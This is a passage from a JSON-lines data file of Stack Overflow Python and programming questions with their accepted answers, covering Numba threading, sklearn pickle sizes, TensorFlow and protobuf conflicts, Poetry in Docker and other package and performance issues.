metaclass might not be all that painful, though.\nIt can be done with a simple call to type passing the new __len__ method:\nIn [13]: class BadBar(metaclass=type(\"\", (FooMeta,), {\"__len__\": lambda cls:9002})):\n    ...:     pass\n    \n\nIn [14]: len(BadBar)\nOut[14]: 9002\n\nOnly if BadBar will later be combined in multiple inheritance with another class hierarchy with a different custom metaclass you will have to worry. Even if there are other classes that have FooMeta as metaclass, the snippet above will work: the dynamically created metaclass will be the metaclass for the new subclass, as the \"most derived subclass\".\nIf however, there is a hierarchy of subclasses and they have differing metaclasses, even if created by this method, you will have to combine both metaclasses in a common subclass_of_the_metaclasses before creating the new  \"ordinary\" subclass.\nIf that is the case, note that you can have one single paramtrizable metaclass, extending your original one (can't dodge that, though)\nclass SubMeta(FooMeta):\n    def __new__(mcls, name, bases, ns, *,class_len):\n         cls = super().__new__(mcls, name, bases, ns)\n         cls._class_len = class_len\n         return cls\n\n    def __len__(cls):\n        return cls._class_len if hasattr(cls, \"_class_len\") else super().__len__()\n\nAnd:\n\nIn [19]: class Foo2(metaclass=SubMeta, class_len=9002): pass\n\nIn [20]: len(Foo2)\nOut[20]: 9002\n\n\n"
}
{
    "Id": 72621273,
    "PostTypeId": 1,
    "Title": "Numba parallelization with prange is slower when used more threads",
    "Body": "I tried a simple code to parallelize a loop with numba and prange. But for some reason when I use more threads instead of going faster it gets slower. Why is this happening? (cpu ryzen 7 2700x 8 cores 16 threads 3.7GHz)\nfrom numba import njit, prange,set_num_threads,get_num_threads\n@njit(parallel=True,fastmath=True)\ndef test1():\n    x=np.empty((10,10))\n    for i in prange(10):\n        for j in range(10):\n            x[i,j]=i+j\n\nNumber of threads : 1\n897 ns \u00b1 18.3 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 2\n1.68 \u00b5s \u00b1 262 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 3\n2.4 \u00b5s \u00b1 163 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 4\n4.12 \u00b5s \u00b1 294 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 5\n4.62 \u00b5s \u00b1 283 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 6\n5.01 \u00b5s \u00b1 145 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 7\n5.52 \u00b5s \u00b1 194 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 8\n4.85 \u00b5s \u00b1 140 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 9\n6.47 \u00b5s \u00b1 348 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 10\n6.88 \u00b5s \u00b1 120 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 11\n7.1 \u00b5s \u00b1 154 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 12\n7.47 \u00b5s \u00b1 159 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 13\n7.91 \u00b5s \u00b1 160 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 14\n9.04 \u00b5s \u00b1 472 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 15\n9.74 \u00b5s \u00b1 581 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\nNumber of threads : 16\n11 \u00b5s \u00b1 967 ns per loop (mean \u00b1 std. dev. of 10 runs, 100000 loops each)\n\n",
    "AcceptedAnswerId": 72621564,
    "AcceptedAnswer": "This is totally normal. Numba needs to create threads and distribute the work between them so they can execute the computation in parallel. Numba can use different threading backends. The default if generally OpenMP and the default OpenMP implementation should be IOMP (OpenMP runtime of ICC/Clang) which try to create threads only once. Still, sharing the work between threads is far slower than iterating over 100 values. A modern mainstream processor should be able to execute the 2 nested loops in sequential in less than 0.1-0.2 us. Numba should also be able to unroll the two loops. The Numba function overhead is also generally about few hundreds of nanoseconds. The allocation of the Numpy array should be far slower than the actual loops. Additionally, there are other overheads causing this code to be significantly slower with multiple threads even if the previous overhead would be negligible. For example, false-sharing causes the writes to be mostly serialized and thus slower than if they would be done one 1 unique threads (because of a cache line bouncing effect operating on the LLC on x86-64 platforms).\nNote that the time to create a thread is generally significantly more than 1 us because a system call is required.\nPut it shortly: use threads when the work to do is big enough and can be efficiently parallelized.\n"
}
{
    "Id": 72561628,
    "PostTypeId": 1,
    "Title": "Why such a big pickle of a sklearn decision tree (30K times bigger)?",
    "Body": "Why pickling a sklearn decision tree can generate a pickle thousands times bigger (in terms of memory) than the original estimator?\nI ran into this issue at work where a random forest estimator (with 100 decision trees) over a dataset with around 1_000_000 samples and 7 features generated a pickle bigger than 2GB.\nI was able to track down the issue to the pickling of a single decision tree and I was able to replicate the issue with a generated dataset as below.\nFor memory estimations I used pympler library. Sklearn version used is 1.0.1\n# here using a regressor tree but I would expect the same issue to be present with a classification tree\nimport pickle\nfrom sklearn.tree import DecisionTreeRegressor\nfrom sklearn.datasets import make_friedman1  # using a dataset generation function from sklear\nfrom pympler import asizeof\n\n# function that creates the dataset and trains the estimator\ndef make_example(n_samples: int):\n    X, y = make_friedman1(n_samples=n_samples, n_features=7, noise=1.0, random_state=49)\n    estimator = DecisionTreeRegressor(max_depth=50, max_features='auto', min_samples_split=5)\n    estimator.fit(X, y)\n    return X, y, estimator\n\n# utilities to compute and compare the size of an object and its pickled version\ndef readable_size(size_in_bytes: int, suffix='B') -> str:\n    num = size_in_bytes\n    for unit in ['', 'k', 'M', 'G', 'T', 'P', 'E', 'Z']:\n        if abs(num) < 1024.0:\n            return \"%3.1f %s%s\" % (num, unit, suffix)\n        num /= 1024.0\n    return \"%.1f%s%s\" % (num, 'Yi', suffix)\n\ndef print_size(obj, skip_detail=False):\n    obj_size = asizeof.asized(obj).size\n    print(readable_size(obj_size))\n    return obj_size\n\ndef compare_with_pickle(obj):\n    size_obj = print_size(obj)\n    size_pickle = print_size(pickle.dumps(obj))\n    print(f\"Ratio pickle/obj: {(size_pickle / size_obj):.2f}\")\n    \n_, _, model100K = make_example(100_000)\ncompare_with_pickle(model100K)\n_, _, model1M = make_example(1_000_000)\ncompare_with_pickle(model1M)\n\noutput:\n1.7 kB\n4.9 MB\nRatio pickle/obj: 2876.22\n1.7 kB\n49.3 MB\nRatio pickle/obj: 28982.84\n\n",
    "AcceptedAnswerId": 72633003,
    "AcceptedAnswer": "As pointed out by @pygeek's answer and subsequent comments, the wrong assumption of the question is that the pickle is increasing the size of the object substantially. Instead the issue lies with pympler.asizeof which is not giving the correct estimate of the tree object.\nIndeed the DecisionTreeRegressor object has a tree_ attribute that has a number of arrays of length tree_.node_count. Using help(sklearn.tree._tree.Tree) we can see that there are 8 such arrays (values, children_left, children_right, feature, impurity, threshold, n_node_samples, weighted_n_node_samples) and the underlying type of every array (except possibly the values array, see note below) should be an underlying 64 bit integer or 64 bit float (the underlying Tree object is a cython object), so a better estimate of the size of a DecisionTree is estimator.tree_.node_count*8*8.\nComputing this estimate for the models above:\ndef print_tree_estimate(tree):\n    print(f\"A tree with max_depth {tree.max_depth} can have up to {2**(tree.max_depth -1)} nodes\")\n    print(f\"This tree has node_count {tree.node_count} and a size estimate is {readable_size(tree.node_count*8*8)}\")\n    \nprint_tree_estimate(model100K.tree_)\nprint()\nprint_tree_estimate(model1M.tree_)\n\ngives as output:\nA tree with max_depth 37 can have up to 68719476736 nodes\nThis tree has node_count 80159 and a size estimate is 4.9 MB\n\nA tree with max_depth 46 can have up to 35184372088832 nodes\nThis tree has node_count 807881 and a size estimate is 49.3 MB\n\nand indeed these estimates are in line with the sizes of pickle objects.\nFurther note that the only way to be sure to bound the size of DecisionTree is to bound max_depth, since a binary tree can have a maximum number of nodes that is bounded by 2**(max_depth - 1), but the specific tree realizations above have a number of nodes well below this theoretical bound.\nnote: the above estimate is valid for this decision tree regressor which has a single output and no classes. estimator.tree_.values is an array of shape [node_count, n_outputs, max_n_classes] so for n_outputs > 1 and/or max_n_classes > 1 the size estimate would need to take into account those and the correct estimate would be estimator.tree_.node_count*8*(7 + n_outputs*max_n_classes)\n"
}
{
    "Id": 72255562,
    "PostTypeId": 1,
    "Title": "Cannot import name 'dtensor' from 'tensorflow.compat.v2.experimental'",
    "Body": "I am having problems trying to run TensorFlow on my Windows 10 machine. Code runs fine on my MacOS machine.\nTraceback (most recent call last):\n  File \"c:\\Users\\Fynn\\Documents\\GitHub\\AlpacaTradingBot\\ai.py\", line 15, in \n    from keras.models import Sequential, load_model\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\__init__.py\", line 24, in \n    from keras import models\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\models\\__init__.py\", line 18, in \n    from keras.engine.functional import Functional\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\engine\\functional.py\", line 24, in \n    from keras.dtensor import layout_map as layout_map_lib\n  File \"C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\keras\\dtensor\\__init__.py\", line 22, in \n    from tensorflow.compat.v2.experimental import dtensor as dtensor_api  # pylint: disable=g-import-not-at-top\nImportError: cannot import name 'dtensor' from 'tensorflow.compat.v2.experimental' (C:\\Users\\Fynn\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\tensorflow\\_api\\v2\\compat\\v2\\experimental\\__init__.py)\n\n",
    "AcceptedAnswerId": 72336599,
    "AcceptedAnswer": "I tried many solutions to no avail, in the end this worked for me!\npip3 uninstall tensorflow absl-py astunparse flatbuffers gast google-pasta grpcio h5py keras keras-preprocessing libclang numpy opt-einsum protobuf setuptools six tensorboard tensorflow-io-gcs-filesystem termcolor tf-estimator-nightly typing-extensions wrapt\n\npip3 install --disable-pip-version-check --no-cache-dir tensorflow\n\n"
}
{
    "Id": 73336136,
    "PostTypeId": 1,
    "Title": "Does having a wrapper object return value (e.g. Integer) cause auto boxing in Java?",
    "Body": "I couldn't find a definitive answer for this seemingly simple question. If I write a method like this:\npublic Integer getAnInt() {\n  int[] i = {4};\n  return i[0];\n}\n\nis the return value autoboxed into an Integer, or does it depend on what happens to the value after it's returned (e.g. whether the variable it is assigned to is declared as an Integer or int)?\n",
    "AcceptedAnswerId": 73336170,
    "AcceptedAnswer": "Yes, boxed\nIt will be (auto)boxed in the bytecode (.class file) because it's part of the public API, so other code might depend on the return value being an Integer.\nThe boxing and unboxing might be removed at runtime by the JITter under the right circumstances, but I don't know if it does that sort of thing.\n"
}
{
    "Id": 73344242,
    "PostTypeId": 1,
    "Title": "Converting float32 to float64 takes more than expected in numpy",
    "Body": "I had a performance issue in a numpy project and then I realized that about 3 fourth of the execution time is wasted on a single line of code:\nerror = abs(detected_matrix[i, step] - original_matrix[j, new])\nand when I have changed the line to\nerror = abs(original_matrix[j, new] - detected_matrix[i, step])\nthe problem has disappeared.\nI relized that the type of original_matrix was float64 and type of detected_matrix was float32. By changing types of either of these two varibles the problem solved.\nI was wondering that if this is a well known issue?\nHere is a sample code that represents the problem\nfrom timeit import timeit\nimport numpy as np\n\nf64 = np.array([1.0], dtype='float64')[0]\nf32 = np.array([1.0], dtype='float32')[0]\n\ntimeit_result = timeit(stmt=\"abs(f32 - f64)\", number=1000000, globals=globals())\nprint(timeit_result)\n\n\ntimeit_result = timeit(stmt=\"abs(f64 - f32)\", number=1000000, globals=globals())\nprint(timeit_result)\n\nOutput in my computer:\n2.8707289\n0.15719420000000017\n\nwhich is quite strange.\n",
    "AcceptedAnswerId": 73346327,
    "AcceptedAnswer": "TL;DR: Please use Numpy >= 1.23.0.\nThis problem has been fixed in Numpy 1.23.0 (more specifically the version 1.23.0-rc1). This pull request rewrites the scalar math logic so to make it faster in many cases including in your specific use-case. With version 1.22.4, the former code is 10 times slower than the second one. This is also true for earlier versions like the 1.21.5. In the 1.23.0, the former is only 10%-15% slower but both takes a very small time: 140 ns/operation versus 122 ns/operation. The small difference is due to a slightly different path taken in the type-checking part of the code. For more information about this low-level behavior, please read this post. Note that iterating over Numpy items it not meant to be very fast, nor operating on Numpy scalar. If your code is limited by that, please consider converting Numpy scalar into Python ones as stated in the 1.23.0 release notes:\n\nMany operations on NumPy scalars are now significantly faster, although\nrare operations (e.g. with 0-D arrays rather than scalars) may be slower\nin some cases. However, even with these improvements users who want the\nbest performance for their scalars, may want to convert a known NumPy\nscalar into a Python one using scalar.item().\n\nAn even faster solution is to use Numba/Cython in this case or just to try to vectorize the encompassing loop if possible.\n"
}
{
    "Id": 72363601,
    "PostTypeId": 1,
    "Title": "How to interpret the \"Package would be ignored\" warning generated by setuptools?",
    "Body": "I work on several python packages that contain data within them. I add them via the MANIFEST.in file, passing include_package_data=True to setup. For example:\n# MANIFEST.in\ngraft mypackage/plugins\ngraft mypackage/data\n\nUp to now, this has worked without warnings as far as I know. However, in setuptools 62.3.0, I get the following message:\nSetuptoolsDeprecationWarning:     Installing 'mypackage.plugins' as data is deprecated, please list it in `packages`.\n07:53:53     !!\n07:53:53 \n07:53:53 \n07:53:53     ############################\n07:53:53     # Package would be ignored #\n07:53:53     ############################\n07:53:53     Python recognizes 'mypackage.plugins' as an importable package, however it is\n07:53:53     included in the distribution as \"data\".\n07:53:53     This behavior is likely to change in future versions of setuptools (and\n07:53:53     therefore is considered deprecated).\n07:53:53 \n07:53:53     Please make sure that 'mypackage.plugins' is included as a package by using\n07:53:53     setuptools' `packages` configuration field or the proper discovery methods\n07:53:53     (for example by using `find_namespace_packages(...)`/`find_namespace:`\n07:53:53     instead of `find_packages(...)`/`find:`).\n07:53:53 \n07:53:53     You can read more about \"package discovery\" and \"data files\" on setuptools\n07:53:53     documentation page.\n\nI get the above warning for pretty much every directory within mypackage that contains data and is included by MANIFEST.in.\nMy goal is to include arbitrary data (which could even include python files in the case of a plugin interface) in a package so that it can be accessed by users who install via wheel or tarball. I would also like that applications built by, e.g., pyinstaller, that pull my package in can easily collect the data with collect_data_files, which for me has worked without any additional setup with the current methodology.\nWhat is the proper way to do this going forward?\n",
    "AcceptedAnswerId": 72660189,
    "AcceptedAnswer": "The TL;DR is that in Python since PEP 420, directories count as packages, even if they don't have a __init__.py file.\nThe main difference is that directories without __init__.py are called \"namespace packages\".\nAccordingly, if a project wants to distribute directories without a __init__.py file, it should use packages=find_namespace_packages() (setup.py) or packages = find_namespace: (setup.cfg). Details on how to use those tools can be found on these docs. Doing this change should make the error go away.\nThe MANIFEST.in or the include_package_data=True should be fine.\n"
}
{
    "Id": 72034176,
    "PostTypeId": 1,
    "Title": "adjust the size of the text label in plotly",
    "Body": "Im trying to adjust the text size accoridng to country size, so the text will be inside the boardes of the copuntry.\nimport pandas as pd\nimport plotly.express as px\n\ndf=pd.read_csv('regional-be-daily-latest.csv', header = 1)\n\nfig = px.choropleth(df, locations='Code', color='Track Name')\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\n\nfig.add_scattergeo(\n\n  locations = df['Code'],\n  text = df['Track Name'],\n  mode = 'text',\n)\n\nfig.show()\n\nFor the visualiztion:\n\nThe text for orange country is inside the boardes of the country but the text to label the blue countrry is bigger.\nBest would be to adjust the size so it will not exceed the boardes of the country\n",
    "AcceptedAnswerId": 72034697,
    "AcceptedAnswer": "You can set the font size using the update_layout function and specifying the font's size by passing the dictionary in the font parameter.\nimport pandas as pd\nimport plotly.express as px\n\ndf=pd.read_csv('regional-be-daily-latest.csv', header = 1)\n\nfig = px.choropleth(df, locations='Code', color='Track Name')\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\n\nfig.add_scattergeo(\n\n  locations = df['Code'],\n  text = df['Track Name'],\n  mode = 'text',\n)\n\n\nfig.update_layout(\n    font=dict(\n        family=\"Courier New, monospace\",\n        size=18,  # Set the font size here\n        color=\"RebeccaPurple\"\n    )\n)\n\nfig.show()\n\n"
}
{
    "Id": 72411825,
    "PostTypeId": 1,
    "Title": "Jupyter notebook in vscode with virtual environment fails to import tensorflow",
    "Body": "I'm attempting to create an isolated virtual environment running tensorflow & tf2onnx using a jupyter notebook in vscode.\nThe tf2onnx packge recommends python 3.7, and my local 3.7.9 version usually works well with tensorflow projects, so I have local and global versions set to 3.7.9 using pyenv.\nThe following is my setup procedure:\npython -m venv .venv\nThen after starting a new terminal in vscode:\npip install tensorflow==2.7.0\npip freeze > requirements.txt\nAfter this, in a cell in my jupyter notebook, the following line fails\nimport tensorflow.keras as keras\n\nException:\n\nTypeError: Descriptors cannot not be created directly.\nIf this call came from a _pb2.py file, your generated code is out of date and must be \nregenerated with protoc >= 3.19.0.\nIf you cannot immediately regenerate your protos, some other possible workarounds are:\n1. Downgrade the protobuf package to 3.20.x or lower.\n2. Set PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python (but this will use pure-Python \nparsing and will be much slower).\n\n\nAt this point, the protobuf package version is showing as v4.21.0 in my requirements file.  I've attempted to pre-install the 3.20.1 version into the virtual environment before installing tensorflow but this yields no effect.\nHere is the full requirements file after installing tensorflow:\nabsl-py==1.0.0\nastunparse==1.6.3\ncachetools==5.1.0\ncertifi==2022.5.18.1\ncharset-normalizer==2.0.12\nflatbuffers==2.0\ngast==0.4.0\ngoogle-auth==2.6.6\ngoogle-auth-oauthlib==0.4.6\ngoogle-pasta==0.2.0\ngrpcio==1.46.3\nh5py==3.7.0\nidna==3.3\nimportlib-metadata==4.11.4\nkeras==2.7.0\nKeras-Preprocessing==1.1.2\nlibclang==14.0.1\nMarkdown==3.3.7\nnumpy==1.21.6\noauthlib==3.2.0\nopt-einsum==3.3.0\nprotobuf==4.21.0\npyasn1==0.4.8\npyasn1-modules==0.2.8\nrequests==2.27.1\nrequests-oauthlib==1.3.1\nrsa==4.8\nsix==1.16.0\ntensorboard==2.9.0\ntensorboard-data-server==0.6.1\ntensorboard-plugin-wit==1.8.1\ntensorflow==2.7.0\ntensorflow-estimator==2.7.0\ntensorflow-io-gcs-filesystem==0.26.0\ntermcolor==1.1.0\ntyping-extensions==4.2.0\nurllib3==1.26.9\nWerkzeug==2.1.2\nwrapt==1.14.1\nzipp==3.8.0\n\n",
    "AcceptedAnswerId": 72414640,
    "AcceptedAnswer": "A recent change in protobuf is causing TensorFlow to break. Downgrading before installing TensorFlow might not work because TensorFlow might be bumping up the version itself. Check if that is what happens during the installation.\nYou might want to either:\nDowngrade with\npip install --upgrade \"protobuf<=3.20.1\"\n\nafter installing TensorFlow, or\nUpgrade TensorFlow to the latest version, as TensorFlow has updated their setup file in their 2.9.1 release.\n"
}
{
    "Id": 72593814,
    "PostTypeId": 1,
    "Title": "Cannot import name 'soft_unicode' from 'markupsafe' in google colab",
    "Body": "I'm trying to install pycaret==3.0.0 in google colab, But I'm having a problem, the library requires Jinja2 to be installed which I did, but then It finally throws off another error.\nImportError                               Traceback (most recent call last)\n in ()\n----> 1 import jinja2\n      2 from pycaret.regression import *\n\n3 frames\n/usr/local/lib/python3.7/dist-packages/jinja2/filters.py in ()\n     11 from markupsafe import escape\n     12 from markupsafe import Markup\n---> 13 from markupsafe import soft_unicode\n     14 \n     15 from ._compat import abc\n\nImportError: cannot import name 'soft_unicode' from 'markupsafe' (/root/.local/lib/python3.7/site-packages/markupsafe/__init__.py)\n\n",
    "AcceptedAnswerId": 72834195,
    "AcceptedAnswer": "This is caused by upgrade in MarkupSafe:2.1.0 where they have removed soft_unicode, try using:\npip install markupsafe==2.0.1\n\n"
}
{
    "Id": 72452403,
    "PostTypeId": 1,
    "Title": "Cross-reference between numpy arrays",
    "Body": "I have a 1d array of ids, for example:\na = [1, 3, 4, 7, 9]\n\nThen another 2d array:\nb = [[1, 4, 7, 9], [3, 7, 9, 1]]\n\nI would like to have a third array with the same shape of b where each item is the index of the corresponding item from a, that is:\nc = [[0, 2, 3, 4], [1, 3, 4, 0]]\n\nWhat's a vectorized way to do that using numpy?\n",
    "AcceptedAnswerId": 72453076,
    "AcceptedAnswer": "Effectively, this solution is a one-liner. The only catch is that you need to reshape the array before you do the one-liner, and then reshape it back again:\nimport numpy as np\n\na = np.array([1, 3, 4, 7, 9])\nb = np.array([[1, 4, 7, 9], [3, 7, 9, 1]])\noriginal_shape = b.shape\n\nc = np.where(b.reshape(b.size, 1) == a)[1]\n\nc = c.reshape(original_shape)\n\nThis results with:\n[[0 2 3 4]\n [1 3 4 0]]\n\n"
}
{
    "Id": 72059380,
    "PostTypeId": 1,
    "Title": "Python fuctional style iterative algoritm?",
    "Body": "In Haskell there is a simple list function available\niterate :: (a -> a) -> a -> [a]\niterate f x =  x : iterate f (f x)\n\nIn python it could be implemented as following:\ndef iterate(f, init):\n  while True:\n    yield init\n    init = f(init)\n\nI was kinda surprised that something basic like this is not part of the functools/itertools modules. Could it be simply costructed in functional style (i.e. without the loop) using the tools provided in these libraries? (Mostly code golf, trying to learn about functional style in Python.)\n",
    "AcceptedAnswerId": 72059725,
    "AcceptedAnswer": "You can do it using some of the functions in itertools:\nfrom itertools import accumulate, repeat\n\ndef iterate(func, initial):\n    return accumulate(repeat(None), func=lambda tot, _: func(tot), initial=initial)\n\nAlthough it's clearly not very clean. Itertools is missing some fundamental functions for constructing streams, like unfoldr. Most of the itertools functions could be defined in terms of unfoldr, as it happens, but functional programming is a little uncomfortable in Python anyways so that might not be much of a benefit.\n"
}
{
    "Id": 72465421,
    "PostTypeId": 1,
    "Title": "How to use poetry with docker?",
    "Body": "How do I install poetry in my image? (should I use pip?)\nWhich version of poetry should I use?\nDo I need a virtual environment?\nThere are many examples and opinions in the wild which offer different solutions.\n",
    "AcceptedAnswerId": 72465422,
    "AcceptedAnswer": "TL;DR\nInstall poetry with pip, configure virtualenv, install dependencies, run your app.\nFROM python:3.10\n\n# Configure Poetry\nENV POETRY_VERSION=1.2.0\nENV POETRY_HOME=/opt/poetry\nENV POETRY_VENV=/opt/poetry-venv\nENV POETRY_CACHE_DIR=/opt/.cache\n\n# Install poetry separated from system interpreter\nRUN python3 -m venv $POETRY_VENV \\\n    && $POETRY_VENV/bin/pip install -U pip setuptools \\\n    && $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}\n\n# Add `poetry` to PATH\nENV PATH=\"${PATH}:${POETRY_VENV}/bin\"\n\nWORKDIR /app\n\n# Install dependencies\nCOPY poetry.lock pyproject.toml ./\nRUN poetry install\n\n# Run your app\nCOPY . /app\nCMD [ \"poetry\", \"run\", \"python\", \"-c\", \"print('Hello, World!')\" ]\n\nIn Detail\nInstalling Poetry\n\nHow do I install poetry in my image? (should I use pip?)\n\nInstall it with pip\nYou should install poetry with pip. but you need to isolate it from the system interpreter and the project's virtual environment.\n\nFor maximum control in your CI environment, installation with pip is fully supported ... offers the best debugging experience, and leaves you subject to the fewest external tools.\n\nENV POETRY_VERSION=1.2.0\nENV POETRY_VENV=/opt/poetry-venv\n\n# Install poetry separated from system interpreter\nRUN python3 -m venv $POETRY_VENV \\\n    && $POETRY_VENV/bin/pip install -U pip setuptools \\\n    && $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}\n\n# Add `poetry` to PATH\nENV PATH=\"${PATH}:${POETRY_VENV}/bin\"\n\nPoetry Version\n\nWhich version of poetry should I use?\n\nSpecify the latest stable version explicitly in your installation.\nForgetting to specify POETRY_VERSION will result in undeterministic builds, as the installer will always install the latest version - which may introduce breaking changes\nVirtual Environment (virtualenv)\n\nDo I need a virtual environment?\n\nYes, and you need to configure it a bit.\nENV POETRY_CACHE_DIR=/opt/.cache\n\nThe reasons for this are somewhat off topic:\n\n By default, poetry creates a virtual environment in $HOME/.cache/pypoetry/virtualenvs to isolate the system interpreter from your application. This is the desired behavior for most development scenarios. When using a container, the $HOME variable may be changed by certain runtimes, so creating the virtual environment in an independent directory solves any reproducibility issues that may arise.\n\nBringing It All Together\nTo use poetry in a docker image you need to:\n\nInstall your desired version of poetry\nConfigure virtual environment location\nInstall your dependencies\nUse poetry run python ... to run your application\n\nA Working Example:\nThis is a minimal flask project managed with poetry.\nYou can copy these contents to your machine to test it out (expect for poerty.lock)\nProject structure\npython-poetry-docker/\n|- Dockerfile\n|- app.py\n|- pyproject.toml\n|- poetry.lock\n\nDockerfile\nFROM python:3.10 as python-base\n\n# https://python-poetry.org/docs#ci-recommendations\nENV POETRY_VERSION=1.2.0\nENV POETRY_HOME=/opt/poetry\nENV POETRY_VENV=/opt/poetry-venv\n\n# Tell Poetry where to place its cache and virtual environment\nENV POETRY_CACHE_DIR=/opt/.cache\n\n# Create stage for Poetry installation\nFROM python-base as poetry-base\n\n# Creating a virtual environment just for poetry and install it with pip\nRUN python3 -m venv $POETRY_VENV \\\n    && $POETRY_VENV/bin/pip install -U pip setuptools \\\n    && $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}\n\n# Create a new stage from the base python image\nFROM python-base as example-app\n\n# Copy Poetry to app image\nCOPY --from=poetry-base ${POETRY_VENV} ${POETRY_VENV}\n\n# Add Poetry to PATH\nENV PATH=\"${PATH}:${POETRY_VENV}/bin\"\n\nWORKDIR /app\n\n# Copy Dependencies\nCOPY poetry.lock pyproject.toml ./\n\n# [OPTIONAL] Validate the project is properly configured\nRUN poetry check\n\n# Install Dependencies\nRUN poetry install --no-interaction --no-cache --without dev\n\n# Copy Application\nCOPY . /app\n\n# Run Application\nEXPOSE 5000\nCMD [ \"poetry\", \"run\", \"python\", \"-m\", \"flask\", \"run\", \"--host=0.0.0.0\" ]\n\napp.py\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello, Docker!'\n\npyproject.toml\n[tool.poetry]\nname = \"python-poetry-docker-example\"\nversion = \"0.1.0\"\ndescription = \"\"\nauthors = [\"Someone \"]\n\n[tool.poetry.dependencies]\npython = \"^3.10\"\nFlask = \"^2.1.2\"\n\n[tool.poetry.dev-dependencies]\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\npoetry.lock\n[[package]]\nname = \"click\"\nversion = \"8.1.3\"\ndescription = \"Composable command line interface toolkit\"\ncategory = \"main\"\noptional = false\npython-versions = \">=3.7\"\n\n[package.dependencies]\n... more lines ommitted\n\nFull contents in gist.\n"
}
{
    "Id": 72920577,
    "PostTypeId": 1,
    "Title": "(mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))",
    "Body": "I have a problem when I run a .py file on a Macbook Air M1:\n[Running] python3 -u \"/Users/kaiyuwei/Documents/graduation project/metaheuristics/run_CRO.py\"\nTraceback (most recent call last):\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/__init__.py\", line 23, in \n    from . import multiarray\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/multiarray.py\", line 10, in \n    from . import overrides\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/overrides.py\", line 6, in \n    from numpy.core._multiarray_umath import (\nImportError: dlopen(/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so, 0x0002): tried: '/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so' (mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/Users/kaiyuwei/Documents/graduation project/metaheuristics/run_CRO.py\", line 1, in \n    from models.multiple_solution.evolutionary_based.CRO import BaseCRO\n  File \"/Users/kaiyuwei/Documents/graduation project/metaheuristics/models/multiple_solution/evolutionary_based/CRO.py\", line 1, in \n    import numpy as np\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/__init__.py\", line 140, in \n    from . import core\n  File \"/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/__init__.py\", line 49, in \n    raise ImportError(msg)\nImportError: \n\nIMPORTANT: PLEASE READ THIS FOR ADVICE ON HOW TO SOLVE THIS ISSUE!\n\nImporting the numpy C-extensions failed. This error can happen for\nmany reasons, often due to issues with your setup or how NumPy was\ninstalled.\n\nWe have compiled some common reasons and troubleshooting tips at:\n\n    https://numpy.org/devdocs/user/troubleshooting-importerror.html\n\nPlease note and check the following:\n\n  * The Python version is: Python3.8 from \"/Library/Developer/CommandLineTools/usr/bin/python3\"\n  * The NumPy version is: \"1.23.1\"\n\nand make sure that they are the versions you expect.\nPlease carefully study the documentation linked above for further help.\n\nOriginal error was: dlopen(/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so, 0x0002): tried: '/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so' (mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))\n\n\n[Done] exited with code=1 in 0.055 seconds\n\nI think the reason is that I'm using the numpy package for 'x86_64', so I tried to use pip install numpy --upgrade to upgrade numpy, but I got output like:\nRequirement already satisfied: numpy in /Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages (1.23.1)\n\nI also tried python3 -m pip install --upgrade pip to upgrade python, but still;\nRequirement already satisfied: pip in /Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages (22.1.2)\n\nCan anyone help me?\n",
    "AcceptedAnswerId": 72920835,
